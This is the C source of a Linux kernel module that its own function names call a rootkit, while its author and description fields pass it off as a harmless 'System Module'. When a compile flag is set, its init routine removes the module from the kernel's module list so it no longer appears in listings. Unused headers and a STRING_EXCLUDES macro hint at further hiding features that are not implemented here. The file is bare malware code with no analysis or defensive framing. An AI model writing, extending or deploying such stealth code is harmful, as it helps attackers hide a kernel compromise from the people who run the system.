#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/version.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("System");
MODULE_DESCRIPTION("System Module");

#ifndef STRING_EXCLUDES
#define STRING_EXCLUDES ""
#endif

#ifndef HIDE_MODULE
#define HIDE_MODULE 0
#endif

static struct list_head *module_previous;
static short module_hidden = 0;

void module_hide(void) {
    if (module_hidden) return;
    module_previous = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    module_hidden = 1;
}

void module_show(void) {
    if (!module_hidden) return;
    list_add(&THIS_MODULE->list, module_previous);
    module_hidden = 0;
}

static int __init rootkit_init(void) {
    printk(KERN_INFO "System module loaded\n");

    #if HIDE_MODULE == 1
    module_hide();
    #endif

    return 0;
}

static void __exit rootkit_exit(void) {
    if (module_hidden) {
        module_show();
    }
    printk(KERN_INFO "System module unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
